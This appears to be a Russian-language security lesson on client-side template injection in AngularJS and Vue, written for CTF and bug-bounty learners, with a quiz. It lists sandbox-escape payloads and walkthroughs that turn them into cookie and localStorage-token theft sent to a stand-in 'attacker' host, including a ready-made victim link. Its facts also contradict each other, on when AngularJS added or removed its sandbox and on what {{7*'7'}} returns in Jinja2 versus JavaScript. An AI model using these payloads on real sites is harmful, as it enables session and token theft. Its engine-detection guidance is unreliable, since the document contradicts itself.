---
id: web-client-side-template-injection
title: "CSTI: клиентский шаблонный инъекшн (AngularJS, Vue)"
category: web
parent: web-xss-bypass-advanced
difficulty: medium
order: 2
tags: [csti, xss, angularjs, vue, template-injection, client-side]
prerequisites: [web-xss, web-ssti]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 36
summary: "Как браузерный шаблонизатор исполняет пользовательский ввод и как из {{...}} получить XSS/RCE-в-странице."
---

Когда серверный шаблонизатор исполняет ввод — это SSTI (`web-ssti`). Когда шаблон компилируется **в браузере** (AngularJS, Vue, Knockout, и т.п.) — это **CSTI (Client-Side Template Injection)**. Ввод, который «всего лишь» попадает в DOM и попадает под компиляцию директив, исполняется как выражение. CSTI — это XSS по эффекту, но обнаруживается и эксплуатируется иначе, и часто обходит фильтры, которые ищут `<script>` и `onerror`.

## Теория: как браузерный шаблонизатор исполняет ввод

**AngularJS** (v1.x) сканирует DOM на директивы (`ng-app`, `ng-bind`, `{{ }}`) и **компилирует** их. Если пользовательский ввод вставляется в DOM внутри области `ng-app`, Angular воспринимает `{{7*7}}` как выражение. Ключевой факт: AngularJS `{{ }}` вычисляется **на клиенте**.

**Vue 2** компилирует шаблоны во время выполнения (runtime compiler). Если приложение использует `new Vue({template: userInput})` или `el.innerHTML` с последующим `$mount`/`compile`, ввод компилируется. Vue 3 с runtime-only сборкой компилирует только доверенные SFC-шаблоны — там CSTI маловероятен.

Общее правило: если ввод достигает **компилятора шаблонов** (а не просто `textContent`), возможна CSTI.

## Теория: детект — математика в шаблоне

Начните с безобидных выражений:

```
{{7*7}}          -> 49  (AngularJS, Vue, Handlebars, многие)
${7*7}           -> 49  (Vue/JS template literals)
<%= 7*7 %>       -> 49  (EJS/ERB-подобные)
{{7*'7'}}        -> 7777777 (AngularJS/JS) vs 49 (Jinja2/Twig)
```

Разные движки дают разные результаты на `{{7*'7'}}`:
- `7777777` → JS-based (AngularJS, Vue).
- `49` → Python/Jinja2/Twig (это уже SSTI, см. `web-ssti-engines`).

Это помогает отличить клиентский шаблон от серверного.

## Теория: песочницы и почему они не спасают

AngularJS 1.6+ добавил **Expression Sandbox**, запрещающий доступ к `window`/`constructor`. Он был обойдён множеством способов (CVE-2016-... и последующие). Даже «безопасное» выражение может достать конструктор:

```
{{constructor.constructor('alert(1)')()}}
```

Vue 2 также имеет ограничения, но `{{ constructor.constructor('...')() }}` и обходы через `$options`, `_c`, `this` известны. Смысл: не считайте клиентскую песочницу гарантией.

## Инструменты и команды

Найти AngularJS и версию:

```bash
curl -s https://target.local/ | grep -oiE 'angular[^"]*\.js'
curl -s https://target.local/ | grep -oiE 'ng-app|ng-controller|ng-bind'
```

Проверить рефлексию `{{ }}` в параметре:

```bash
curl -s 'https://target.local/?q=%7B%7B7*7%7D%7D' | grep -o '49'
```

Проверить Vue:

```bash
curl -s https://target.local/ | grep -oiE 'vue[^"]*\.js'
```

В Burp удобно **Repeater**-ом менять параметр и смотреть, отрендерился ли результат выражения в ответе/в DOM. Для клиентской части — DevTools + вставка выражения в DOM.

## Разобранный пример: CSTI в AngularJS → XSS

Шаг 1. Детект. В поле поиска отправляем `{{7*7}}`. Если на странице появляется `49` — шаблон компилируется на клиенте.

Шаг 2. Проверяем различие движка: отправляем `{{7*'7'}}`. Видим `7777777` → это JS/Angular, а не Jinja.

Шаг 3. Эскалируем до исполнения. Классический обход песочницы AngularJS (v1.x):

```
{{constructor.constructor('alert(document.domain)')()}}
```

Если CSP/фильтр не мешает и песочница обойдена — получаем исполнение JS в контексте страницы. Далее — кража cookie (`document.cookie`) или токена из `localStorage`.

Шаг 4. В отчёте: точный параметр, пейлоад, версия AngularJS, доказательство исполнения.

## Разобранный пример: Vue 2 runtime compiler

Если приложение делает:

```js
new Vue({ el: '#app', template: '<div>' + userInput + '</div>' });
```

то `userInput = '{{ 7*7 }}'` → `49`, а `userInput = '{{ constructor.constructor("alert(1)")() }}'` может исполниться (в зависимости от версии/сборки). Проверяйте наличие runtime-компилятора: в runtime-only сборке `Vue.compile` undefined.

```js
// в консоли
typeof Vue.compile;   // "function" => runtime compiler доступен => CSTI возможна
```

## Частые ошибки

- **Путать CSTI и SSTI.** CSTI исполняется в браузере, SSTI — на сервере. Признак различия — поведение `{{7*'7'}}`.
- **Искать только `<script>`.** CSTI не требует `<script>`; фильтры XSS её пропускают.
- **Игнорировать песочницу.** Она есть, но обходится — не делайте вывод «безопасно» из-за sandbox.
- **Считать Vue 3 уязвимым всегда.** Runtime-only сборка компилирует только доверенные шаблоны.
- **Забывать про контекст `ng-app`.** Вне области `ng-app` выражения не компилируются.

## Полная карта движков и версий

CSTI зависит от того, какой шаблонизатор исполняется в браузере. Ниже сводка с уязвимыми версиями и пейлоадами.

| Движок | Синтаксис | Уязвим | Пейлоад-детект |
|--------|-----------|--------|----------------|
| AngularJS 1.x | `{{ }}` | < 1.6 (sandbox escapes) | `{{7*7}}` → `49` |
| Vue 2 (runtime) | `{{ }}` | компилятор в runtime | `{{7*7}}` → `49` |
| Vue 3 | `{{ }}` | компилятор не в runtime | обычно нет |
| Handlebars (client) | `{{ }}` | если `compile` доступен | `{{7*7}}` |
| Knockout | `data-bind` | если eval | `data-bind="..."` |
| Rivets | `rv-` | если eval | `rv-text="..."` |
| Polymer | `[[ ]]` | если eval | `[[7*7]]` |

Ключ: CSTI возможен только там, где шаблон **компилируется во время выполнения** из пользовательского ввода.

## AngularJS sandbox escapes по версиям

AngularJS 1.x удалял «песочницу» в 1.6, а до этого её регулярно обходили.

```text
# базовый детект
{{7*7}}

# версии < 1.6: классические escape'ы
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
{{a='constructor';b={};b[a]('alert(1)')()}}
```

```bash
# детект через curl (сервер отражает шаблон)
curl -s 'https://app.example/?q=%7B%7B7*7%7D%7D' | grep -o '49'
```

Если `49` появилось — шаблон исполняется. Для современного Angular (2+) CSTI как класс не работает.

## Vue 2 runtime compiler: эксплуатация

Vue 2 в сборке с компилятором (`vue.js`, не `vue.runtime.js`) исполняет шаблоны из строк.

```javascript
// уязвимый код
new Vue({ el: '#app', template: userInput });
```

```text
# детект
{{7*7}}
# RCE в браузере (нет прямого доступа к процессу, но есть DOM/network)
{{constructor.constructor('fetch("//attacker/?c="+document.cookie)')()}}
# или через глобальный объект
{{_c.constructor('alert(1)')()}}
```

Проверяйте, какая сборка Vue подключена: `vue.js` (с компилятором) — уязвимо, `vue.runtime.js` — нет.

## Разобранный пример: CSTI → XSS → кража токена

```bash
# 1) находим отражение шаблона
curl -s 'https://app.example/search?q={{7*7}}' | grep -o '49'
# 2) подтверждаем исполнение
curl -s 'https://app.example/search?q={{constructor.constructor("alert(1)")()}}'
# 3) строим XSS-пейлоад для кражи токена
#    {{constructor.constructor('fetch("https://attacker/?t="+localStorage.token)')()}}
# 4) формируем ссылку для жертвы
https://app.example/search?q={{constructor.constructor('fetch("//attacker/?t="+localStorage.token)')()}}
```

Доказательство: callback на attacker с токеном. Обход CSP: если `unsafe-eval` разрешён (нужен компилятору), XSS сработает даже при строгой `script-src`.

## Что делать дальше / решение

1. **Определите движок.** Смотрите JS-бандлы: AngularJS/Vue/Handlebars/Knockout.
2. **Проверьте компиляцию в runtime.** `vue.js` vs `vue.runtime.js`.
3. **Детект математикой.** `{{7*7}}` / `[[7*7]]`.
4. **Подберите escape под версию.** Для AngularJS — по таблице версий.
5. **Постройте XSS.** Кража токена/DOM-данных.
6. **Зафиксируйте PoC.** URL/поле + callback/alert.

## Практика и справочники

- **PortSwigger Academy** — «Client-side template injection».
- **HackTricks** — «SSTI (client-side)».
- **PayloadsAllTheThings** — «Client Side Template Injection».
- **angularjs sandbox escapes** (PortSwigger research) — сводка по версиям.

## Детект CSTI: пошаговый алгоритм

```text
# шаг 1: базовый математический детект (разные синтаксисы)
{{7*7}}   ${7*7}   #{7*7}   [[7*7]]   <%= 7*7 %>

# шаг 2: различаем движок по строковой конкатенации
{{7*'7'}}   # Jinja2 -> 7777777 ; Twig -> 49
${7*7}      # Freemarker/Velocity (Java)
```

```bash
# массовый прогон по всем параметрам страницы
ffuf -u 'https://app.example/page?FUZZ={{7*7}}' -w params.txt -mr '49'
# проверка отражения
curl -s 'https://app.example/?q={{7*7}}' | grep -o '49'
```

## Условия, при которых CSTI возможен

| Условие | Почему важно |
|---------|--------------|
| Шаблон строится из ввода | без этого нет инъекции |
| Компилятор в runtime | Vue 2 `vue.js`, AngularJS, Handlebars `compile` |
| Ввод не экранируется | иначе `{{ }}` нейтрализуются |
| Sink — DOM/HTML | шаблон исполняется в контексте страницы |

Если приложение использует предкомпилированные шаблоны (Vue runtime-only, React JSX, Angular AOT), CSTI как класс не работает — ввод не интерпретируется как шаблон.

## CSTI в других библиотеках

Помимо AngularJS и Vue, CSTI встречается в:

- **Handlebars** (client) — если `Handlebars.compile(userInput)`.
- **Knockout** — `data-bind` с eval.
- **Rivets / Ractive** — шаблоны из строк.
- **Ember (старые)** — `{{ }}` из пользовательских значений.

Проверяйте, есть ли в бандле вызовы `compile`/`template`/`new Function`, принимающие пользовательские строки.

## Что делать дальше / решение (кратко)

1. Определите движок по JS-бандлам и синтаксису.
2. Проверьте, компилируется ли шаблон в runtime.
3. Подтвердите детект (`49`).
4. Подберите escape под версию движка.
5. Постройте XSS/кражу токена.
6. Оформите PoC (URL + callback).

## Практика

- **PortSwigger Academy** — Client-side template injection.
- **PayloadsAllTheThings** — CSTI.
- **HackTricks** — CSTI.

## Практический приоритет

CSTI ищут там, где пользовательский ввод попадает в шаблон, компилируемый браузером: legacy-AngularJS-приложения, Vue 2 в сборке с компилятором, клиентский Handlebars. Если приложение собрано с AOT/precompiled-шаблонами (React, Vue 3, Angular 2+), этот класс почти не встречается. Поэтому первый шаг — посмотреть, какие JS-библиотеки и в какой сборке подключены; от этого зависит, стоит ли вообще тратить время на математический детект и подбор escape'ов.

## Ещё одна деталь

Не забывайте про серверный рендеринг: если приложение отдаёт шаблон, который затем компилируется на клиенте (SSR + hydration), точка инъекции может быть на сервере, а исполнение — в браузере. Проверяйте оба слоя и не считайте «серверную» экранизацию достаточной, если клиент всё равно строит шаблон из пришедшей строки.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Чем CSTI отличается от SSTI?"
  options:
    - "CSTI исполняется в браузере, SSTI — на сервере"
    - "CSTI работает только по HTTPS"
    - "SSTI не существует"
    - "Ничем"
  answer: 0
  explanation: "Клиентский шаблон компилируется браузером, серверный — сервером."
- question: "Что означает результат `{{7*'7'}} == 7777777`?"
  options:
    - "Это Jinja2/Twig"
    - "Это JS-движок (AngularJS/Vue)"
    - "Это Python"
    - "Это SQL"
  answer: 1
  explanation: "Конкатенация/приведение строки — поведение JavaScript-выражений."
- question: "Зачем AngularJS добавил Expression Sandbox?"
  options:
    - "Для скорости"
    - "Чтобы ограничить доступ к `window`/`constructor` из выражений"
    - "Для шифрования"
    - "Для CORS"
  answer: 1
  explanation: "Sandbox пытается запретить опасные доступы, но исторически обходится."
- question: "Что проверить, чтобы понять, возможна ли CSTI во Vue?"
  options:
    - "Наличие runtime-компилятора (`Vue.compile`)"
    - "Заголовок `Server`"
    - "Наличие cookie"
    - "Порт сервера"
  answer: 0
  explanation: "CSTI возможна, если шаблон компилируется во время выполнения."
- question: "Почему фильтры XSS часто пропускают CSTI?"
  options:
    - "Они ищут `<script>`/`onerror`, а CSTI не требует их"
    - "CSTI работает без интернета"
    - "CSTI — это SQL"
    - "Фильтры не читают HTML"
  answer: 0
  explanation: "CSTI исполняется через директивы/шаблонные выражения, а не через теги-скрипты."
```

## Где пригодится

- **CTF (Web):** задачи со `{{ }}` в параметрах и «странным» рендерингом — почти всегда CSTI/SSTI.
- **Bug bounty:** старые AngularJS-приложения и Vue-runtime — реальные цели.
- **Пентест:** анализ SPA и легаси-фронтендов; поиск компиляции пользовательского ввода.
- **Работа (AppSec/Dev):** понимание, почему `innerHTML`+AngularJS-контекст опасен; запрет runtime-компиляции недоверенных шаблонов.
